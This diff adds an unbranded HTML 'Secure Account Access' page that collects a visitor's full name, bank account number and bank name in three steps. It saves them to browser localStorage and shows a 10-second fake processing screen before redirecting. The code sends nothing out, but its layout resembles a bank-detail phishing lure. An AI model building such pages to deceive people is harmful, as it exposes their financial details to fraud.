@@ -1,0 +1,750 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>Login</title>
+
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            font-family: Arial, Helvetica, sans-serif;
+            background:
+                radial-gradient(circle at top left, rgba(0, 183, 255, 0.20), transparent 35%),
+                radial-gradient(circle at bottom right, rgba(30, 80, 255, 0.20), transparent 35%),
+                linear-gradient(135deg, #06142f, #0a2450 50%, #031027);
+            color: #ffffff;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 500px;
+        }
+
+        .card {
+            position: relative;
+            overflow: hidden;
+            padding: 38px 30px 30px;
+            border-radius: 26px;
+            background: rgba(255, 255, 255, 0.09);
+            border: 1px solid rgba(255, 255, 255, 0.16);
+            backdrop-filter: blur(18px);
+            -webkit-backdrop-filter: blur(18px);
+            box-shadow:
+                0 25px 70px rgba(0, 0, 0, 0.40),
+                inset 0 1px 0 rgba(255, 255, 255, 0.10);
+        }
+
+        .card::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 4px;
+            background: linear-gradient(90deg, #168cff, #00d9ff, #168cff);
+        }
+
+        .security-icon {
+            position: relative;
+            width: 92px;
+            height: 92px;
+            margin: 0 auto 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .security-icon::before {
+            content: "";
+            position: absolute;
+            width: 86px;
+            height: 86px;
+            border-radius: 50%;
+            border: 3px solid transparent;
+            border-top-color: #19c9ff;
+            border-right-color: #168cff;
+            animation: rotateRing 1.7s linear infinite;
+            filter: drop-shadow(0 0 7px rgba(25, 201, 255, 0.65));
+        }
+
+        .security-icon::after {
+            content: "";
+            position: absolute;
+            width: 70px;
+            height: 70px;
+            border-radius: 50%;
+            border: 1px solid rgba(255, 255, 255, 0.16);
+        }
+
+        .key-icon {
+            position: relative;
+            z-index: 2;
+            width: 62px;
+            height: 62px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.10);
+            box-shadow:
+                0 8px 25px rgba(0, 0, 0, 0.25),
+                inset 0 1px 0 rgba(255, 255, 255, 0.12);
+            font-size: 32px;
+        }
+
+        @keyframes rotateRing {
+            from {
+                transform: rotate(0deg);
+            }
+
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        .heading {
+            text-align: center;
+            margin-bottom: 28px;
+        }
+
+        .heading h1 {
+            font-size: 25px;
+            font-weight: 700;
+            margin-bottom: 8px;
+        }
+
+        .heading p {
+            color: rgba(255, 255, 255, 0.70);
+            font-size: 14px;
+            line-height: 1.5;
+        }
+
+        .progress-section {
+            margin-bottom: 30px;
+        }
+
+        .progress-info {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 10px;
+            font-size: 13px;
+            color: rgba(255, 255, 255, 0.75);
+        }
+
+        .progress-percent {
+            color: #52d7ff;
+            font-weight: 700;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 7px;
+            border-radius: 20px;
+            overflow: hidden;
+            background: rgba(255, 255, 255, 0.12);
+        }
+
+        .progress-fill {
+            width: 33.33%;
+            height: 100%;
+            border-radius: 20px;
+            background: linear-gradient(90deg, #168cff, #22d8ff);
+            box-shadow: 0 0 12px rgba(34, 216, 255, 0.55);
+            transition: width 0.35s ease;
+        }
+
+        .step {
+            display: none;
+        }
+
+        .step.active {
+            display: block;
+            animation: fadeIn 0.3s ease;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(8px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .step-title {
+            font-size: 18px;
+            font-weight: 700;
+            margin-bottom: 7px;
+        }
+
+        .step-description {
+            color: rgba(255, 255, 255, 0.62);
+            font-size: 13px;
+            margin-bottom: 18px;
+            line-height: 1.5;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        .input-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 13px;
+            font-weight: 600;
+            color: rgba(255, 255, 255, 0.88);
+        }
+
+        .input-box {
+            position: relative;
+        }
+
+        .input-box span {
+            position: absolute;
+            left: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 18px;
+            opacity: 0.75;
+            pointer-events: none;
+        }
+
+        .input-box input {
+            width: 100%;
+            padding: 15px 15px 15px 46px;
+            border: 1px solid rgba(255, 255, 255, 0.16);
+            border-radius: 14px;
+            outline: none;
+            color: #ffffff;
+            font-size: 15px;
+            background: rgba(0, 0, 0, 0.17);
+            transition: 0.25s ease;
+        }
+
+        .input-box input::placeholder {
+            color: rgba(255, 255, 255, 0.38);
+        }
+
+        .input-box input:focus {
+            border-color: #22cfff;
+            background: rgba(0, 0, 0, 0.25);
+            box-shadow: 0 0 0 3px rgba(34, 207, 255, 0.10);
+        }
+
+        .continue-btn {
+            width: 100%;
+            border: none;
+            border-radius: 14px;
+            padding: 15px;
+            color: #ffffff;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            background: linear-gradient(135deg, #087cf0, #08bde8);
+            box-shadow: 0 10px 25px rgba(0, 140, 240, 0.25);
+            transition: 0.25s ease;
+        }
+
+        .continue-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 14px 30px rgba(0, 180, 255, 0.30);
+        }
+
+        .continue-btn:active {
+            transform: translateY(0);
+        }
+
+        .error {
+            display: none;
+            margin-top: 10px;
+            padding: 10px 12px;
+            border-radius: 10px;
+            background: rgba(255, 70, 70, 0.12);
+            border: 1px solid rgba(255, 90, 90, 0.20);
+            color: #ff9c9c;
+            font-size: 13px;
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 25px;
+            color: rgba(255, 255, 255, 0.45);
+            font-size: 11px;
+            line-height: 1.6;
+        }
+
+        /* 10-Second Loading Screen */
+        .loading-screen {
+            position: fixed;
+            inset: 0;
+            z-index: 9999;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            background:
+                radial-gradient(circle at top left, rgba(0, 183, 255, 0.18), transparent 35%),
+                radial-gradient(circle at bottom right, rgba(30, 80, 255, 0.20), transparent 35%),
+                linear-gradient(135deg, #06142f, #0a2450 50%, #031027);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+        }
+
+        .loader-box {
+            width: 90%;
+            max-width: 340px;
+            text-align: center;
+            padding: 35px 25px;
+            border-radius: 22px;
+            background: rgba(255, 255, 255, 0.08);
+            border: 1px solid rgba(255, 255, 255, 0.14);
+            box-shadow:
+                0 25px 70px rgba(0, 0, 0, 0.40),
+                inset 0 1px 0 rgba(255, 255, 255, 0.08);
+        }
+
+        .loader {
+            width: 58px;
+            height: 58px;
+            margin: 0 auto 20px;
+            border: 4px solid rgba(255, 255, 255, 0.15);
+            border-top-color: #22d8ff;
+            border-right-color: #168cff;
+            border-radius: 50%;
+            animation: loadingSpin 0.9s linear infinite;
+            filter: drop-shadow(0 0 8px rgba(34, 216, 255, 0.35));
+        }
+
+        .loading-title {
+            font-size: 20px;
+            font-weight: 700;
+            margin-bottom: 8px;
+        }
+
+        .loading-text {
+            color: rgba(255, 255, 255, 0.65);
+            font-size: 13px;
+            line-height: 1.5;
+        }
+
+        @keyframes loadingSpin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        @media (max-width: 480px) {
+            body {
+                padding: 14px;
+            }
+
+            .card {
+                padding: 34px 20px 25px;
+                border-radius: 22px;
+            }
+
+            .heading h1 {
+                font-size: 22px;
+            }
+
+            .security-icon {
+                margin-bottom: 20px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="container">
+
+        <div class="card">
+
+            <div class="security-icon">
+                <div class="key-icon">🔐</div>
+            </div>
+
+            <div class="heading">
+                <h1 id="mainTitle">Secure Account Access</h1>
+                <p id="mainSubtitle">
+                    Enter your information below to continue.
+                </p>
+            </div>
+
+            <div class="progress-section">
+                <div class="progress-info">
+                    <span id="stepText">Step 1 of 3</span>
+                    <span class="progress-percent" id="progressPercent">33%</span>
+                </div>
+
+                <div class="progress-bar">
+                    <div class="progress-fill" id="progressFill"></div>
+                </div>
+            </div>
+
+            <!-- STEP 1 -->
+            <div class="step active" id="step1">
+
+                <div class="step-title" id="step1Title">
+                    Full Name
+                </div>
+
+                <div class="step-description" id="step1Description">
+                    Enter your full name as it appears on your account.
+                </div>
+
+                <div class="input-group">
+                    <label for="fullName" id="fullNameLabel">
+                        Full Name
+                    </label>
+
+                    <div class="input-box">
+                        <span>👤</span>
+                        <input
+                            type="text"
+                            id="fullName"
+                            placeholder="Enter your full name"
+                            autocomplete="name"
+                        >
+                    </div>
+
+                    <div class="error" id="error1"></div>
+                </div>
+
+                <button class="continue-btn" onclick="nextStep(1)" id="continue1">
+                    Continue
+                </button>
+
+            </div>
+
+            <!-- STEP 2 -->
+            <div class="step" id="step2">
+
+                <div class="step-title" id="step2Title">
+                    Account Number
+                </div>
+
+                <div class="step-description" id="step2Description">
+                    Enter your account number.
+                </div>
+
+                <div class="input-group">
+                    <label for="accountNumber" id="accountNumberLabel">
+                        Account Number
+                    </label>
+
+                    <div class="input-box">
+                        <span>💳</span>
+                        <input
+                            type="text"
+                            id="accountNumber"
+                            placeholder="Enter your account number"
+                            inputmode="numeric"
+                        >
+                    </div>
+
+                    <div class="error" id="error2"></div>
+                </div>
+
+                <button class="continue-btn" onclick="nextStep(2)" id="continue2">
+                    Continue
+                </button>
+
+            </div>
+
+            <!-- STEP 3 -->
+            <div class="step" id="step3">
+
+                <div class="step-title" id="step3Title">
+                    Bank Name
+                </div>
+
+                <div class="step-description" id="step3Description">
+                    Enter the name of your bank.
+                </div>
+
+                <div class="input-group">
+                    <label for="bankName" id="bankNameLabel">
+                        Bank Name
+                    </label>
+
+                    <div class="input-box">
+                        <span>🏦</span>
+                        <input
+                            type="text"
+                            id="bankName"
+                            placeholder="Enter your bank name"
+                        >
+                    </div>
+
+                    <div class="error" id="error3"></div>
+                </div>
+
+                <button class="continue-btn" onclick="nextStep(3)" id="continue3">
+                    Continue
+                </button>
+
+            </div>
+
+            <div class="footer" id="footerText">
+                Please provide accurate information to continue.
+            </div>
+
+        </div>
+
+    </div>
+
+    <!-- Loading Screen -->
+    <div id="loadingScreen" class="loading-screen">
+        <div class="loader-box">
+            <div class="loader"></div>
+
+            <div class="loading-title" id="loadingTitle">
+                Processing...
+            </div>
+
+            <div class="loading-text" id="loadingText">
+                Please wait while we continue.
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const language = localStorage.getItem("language") || "en";
+
+        const translations = {
+
+            en: {
+                title: "Secure Account Access",
+                subtitle: "Enter your information below to continue.",
+
+                step: "Step",
+                of: "of",
+
+                fullNameTitle: "Full Name",
+                fullNameDescription: "Enter your full name as it appears on your account.",
+                fullNameLabel: "Full Name",
+                fullNamePlaceholder: "Enter your full name",
+
+                accountTitle: "Account Number",
+                accountDescription: "Enter your account number.",
+                accountLabel: "Account Number",
+                accountPlaceholder: "Enter your account number",
+
+                bankTitle: "Bank Name",
+                bankDescription: "Enter the name of your bank.",
+                bankLabel: "Bank Name",
+                bankPlaceholder: "Enter your bank name",
+
+                continue: "Continue",
+
+                requiredName: "Please enter your full name.",
+                requiredAccount: "Please enter your account number.",
+                requiredBank: "Please enter your bank name.",
+
+                footer: "Please provide accurate information to continue.",
+
+                loadingTitle: "Processing...",
+                loadingText: "Please wait while we continue."
+            },
+
+            es: {
+                title: "Acceso Seguro a la Cuenta",
+                subtitle: "Ingresa tu información a continuación para continuar.",
+
+                step: "Paso",
+                of: "de",
+
+                fullNameTitle: "Nombre Completo",
+                fullNameDescription: "Ingresa tu nombre completo tal como aparece en tu cuenta.",
+                fullNameLabel: "Nombre Completo",
+                fullNamePlaceholder: "Ingresa tu nombre completo",
+
+                accountTitle: "Número de Cuenta",
+                accountDescription: "Ingresa tu número de cuenta.",
+                accountLabel: "Número de Cuenta",
+                accountPlaceholder: "Ingresa tu número de cuenta",
+
+                bankTitle: "Nombre del Banco",
+                bankDescription: "Ingresa el nombre de tu banco.",
+                bankLabel: "Nombre del Banco",
+                bankPlaceholder: "Ingresa el nombre de tu banco",
+
+                continue: "Continuar",
+
+                requiredName: "Ingresa tu nombre completo.",
+                requiredAccount: "Ingresa tu número de cuenta.",
+                requiredBank: "Ingresa el nombre de tu banco.",
+
+                footer: "Proporciona información correcta para continuar.",
+
+                loadingTitle: "Procesando...",
+                loadingText: "Espera mientras continuamos."
+            }
+        };
+
+        const t = translations[language] || translations.en;
+
+        document.getElementById("mainTitle").textContent = t.title;
+        document.getElementById("mainSubtitle").textContent = t.subtitle;
+
+        document.getElementById("step1Title").textContent = t.fullNameTitle;
+        document.getElementById("step1Description").textContent = t.fullNameDescription;
+        document.getElementById("fullNameLabel").textContent = t.fullNameLabel;
+        document.getElementById("fullName").placeholder = t.fullNamePlaceholder;
+
+        document.getElementById("step2Title").textContent = t.accountTitle;
+        document.getElementById("step2Description").textContent = t.accountDescription;
+        document.getElementById("accountNumberLabel").textContent = t.accountLabel;
+        document.getElementById("accountNumber").placeholder = t.accountPlaceholder;
+
+        document.getElementById("step3Title").textContent = t.bankTitle;
+        document.getElementById("step3Description").textContent = t.bankDescription;
+        document.getElementById("bankNameLabel").textContent = t.bankLabel;
+        document.getElementById("bankName").placeholder = t.bankPlaceholder;
+
+        document.getElementById("continue1").textContent = t.continue;
+        document.getElementById("continue2").textContent = t.continue;
+        document.getElementById("continue3").textContent = t.continue;
+
+        document.getElementById("footerText").textContent = t.footer;
+
+        document.getElementById("loadingTitle").textContent = t.loadingTitle;
+        document.getElementById("loadingText").textContent = t.loadingText;
+
+        let currentStep = 1;
+
+        function updateProgress() {
+            const percent = Math.round((currentStep / 3) * 100);
+
+            document.getElementById("progressFill").style.width = percent + "%";
+            document.getElementById("progressPercent").textContent = percent + "%";
+
+            document.getElementById("stepText").textContent =
+                t.step + " " + currentStep + " " + t.of + " 3";
+        }
+
+        function showError(id, message) {
+            const error = document.getElementById(id);
+            error.textContent = message;
+            error.style.display = "block";
+        }
+
+        function hideError(id) {
+            document.getElementById(id).style.display = "none";
+        }
+
+        function nextStep(step) {
+
+            if (step === 1) {
+
+                const fullName =
+                    document.getElementById("fullName").value.trim();
+
+                if (!fullName) {
+                    showError("error1", t.requiredName);
+                    return;
+                }
+
+                hideError("error1");
+
+            } else if (step === 2) {
+
+                const accountNumber =
+                    document.getElementById("accountNumber").value.trim();
+
+                if (!accountNumber) {
+                    showError("error2", t.requiredAccount);
+                    return;
+                }
+
+                hideError("error2");
+
+            } else if (step === 3) {
+
+                const bankName =
+                    document.getElementById("bankName").value.trim();
+
+                if (!bankName) {
+                    showError("error3", t.requiredBank);
+                    return;
+                }
+
+                hideError("error3");
+
+                const accountData = {
+                    fullName:
+                        document.getElementById("fullName").value.trim(),
+
+                    accountNumber:
+                        document.getElementById("accountNumber").value.trim(),
+
+                    bankName:
+                        document.getElementById("bankName").value.trim()
+                };
+
+                localStorage.setItem(
+                    "loginAccount",
+                    JSON.stringify(accountData)
+                );
+
+                /* Show loading animation for 10 seconds */
+                document.getElementById("loadingScreen").style.display = "flex";
+
+                setTimeout(() => {
+                    window.location.href = "welcome.html";
+                }, 10000);
+
+                return;
+            }
+
+            document.getElementById("step" + currentStep)
+                .classList.remove("active");
+
+            currentStep = step + 1;
+
+            document.getElementById("step" + currentStep)
+                .classList.add("active");
+
+            updateProgress();
+        }
+
+        /* Enter key support */
+        document.querySelectorAll("input").forEach(input => {
+
+            input.addEventListener("keydown", function(event) {
+
+                if (event.key === "Enter") {
+
+                    event.preventDefault();
+
+                    nextStep(currentStep);
+                }
+
+            });
+
+        });
+
+        updateProgress();
+    </script>
+
+</body>
+
+</html>
